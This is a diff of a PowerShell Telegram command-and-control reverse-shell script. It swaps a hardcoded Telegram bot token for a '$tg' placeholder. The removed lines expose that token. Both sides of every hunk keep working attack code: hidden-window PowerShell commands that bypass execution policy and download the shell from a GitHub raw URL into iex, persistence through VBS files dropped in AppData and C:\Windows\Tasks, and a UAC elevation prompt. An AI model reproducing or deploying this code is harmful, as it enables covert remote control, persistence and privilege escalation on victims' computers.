@@ -11,7 +11,7 @@ SEE README FOR MORE INFO
 #>
 # ---------------------------------------------- SCRIPT SETUP -----------------------------------------------
 # Define Connection Variables
-$Token = "6869215015:AAFCUzLNAgsyZz1KJ7YTfEzVyJhstWdn8nM"  # REPLACE $tg with Your Telegram Bot Token ( LEAVE ALONE WHEN USING A STAGER.. eg. A Flipper Zero,  Start-TGC2-Client.vbs etc )
+$Token = "$tg"  # REPLACE $tg with Your Telegram Bot Token ( LEAVE ALONE WHEN USING A STAGER.. eg. A Flipper Zero,  Start-TGC2-Client.vbs etc )
 $PassPhrase = "$env:COMPUTERNAME" # 'password' for this connection (computername by default)
 $global:errormsg = 0 # 1 = return error messages to chat (off by default)
 $HideWindow = 1 # HIDE THE WINDOW - Change to 1 to hide the console window
@@ -52,7 +52,7 @@ Write-Output "Persistance Installed - Checking Version.."
         $tobat = @"
 Set WshShell = WScript.CreateObject(`"WScript.Shell`")
 WScript.Sleep 200
-WshShell.Run `"powershell.exe -NonI -NoP -Ep Bypass -W H -C `6869215015:AAFCUzLNAgsyZz1KJ7YTfEzVyJhstWdn8nM='6869215015:AAFCUzLNAgsyZz1KJ7YTfEzVyJhstWdn8nM'; irm https://raw.githubusercontent.com/curiouscat-me/Dumb-Projects-for-Myself/main/Telegram-C2-Reverse-Shell.ps1 | iex`", 0, True
+WshShell.Run `"powershell.exe -NonI -NoP -Ep Bypass -W H -C `$tg='$tg'; irm https://raw.githubusercontent.com/curiouscat-me/Dumb-Projects-for-Myself/main/Telegram-C2-Reverse-Shell.ps1 | iex`", 0, True
 "@
         $tobat | Out-File -FilePath $VBpath -Force
         sleep 1
@@ -562,7 +562,7 @@ $newScriptPath = "$env:APPDATA\Microsoft\Windows\Templates\copy.ps1"
 $scriptContent | Out-File -FilePath $newScriptPath -force
 sleep 1
 if ($newScriptPath.Length -lt 100){
-    "`6869215015:AAFCUzLNAgsyZz1KJ7YTfEzVyJhstWdn8nM = `"6869215015:AAFCUzLNAgsyZz1KJ7YTfEzVyJhstWdn8nM`"" | Out-File -FilePath $newScriptPath -Force
+    "`$tg = `"$tg`"" | Out-File -FilePath $newScriptPath -Force
     i`wr -Uri "$parent" -OutFile "$env:temp/temp.ps1"
     sleep 1
     Get-Content -Path "$env:temp/temp.ps1" | Out-File $newScriptPath -Append
@@ -609,7 +609,7 @@ If Not WScript.Arguments.Named.Exists(`"elevate`") Then
     , `"`"`"`" & WScript.ScriptFullName & `"`"`" /elevate`", `"`", `"runas`", 1
   WScript.Quit
 End If
-WshShell.Run `"powershell.exe -NonI -NoP -Ep Bypass -W H -C `6869215015:AAFCUzLNAgsyZz1KJ7YTfEzVyJhstWdn8nM='6869215015:AAFCUzLNAgsyZz1KJ7YTfEzVyJhstWdn8nM'; irm https://raw.githubusercontent.com/curiouscat-me/Dumb-Projects-for-Myself/main/Telegram-C2-Reverse-Shell.ps1 | iex`", 0, True
+WshShell.Run `"powershell.exe -NonI -NoP -Ep Bypass -W H -C `$tg='$tg'; irm https://raw.githubusercontent.com/curiouscat-me/Dumb-Projects-for-Myself/main/Telegram-C2-Reverse-Shell.ps1 | iex`", 0, True
 "@
 $pth = "C:\Windows\Tasks\service.vbs"
 $tobat | Out-File -FilePath $pth -Force
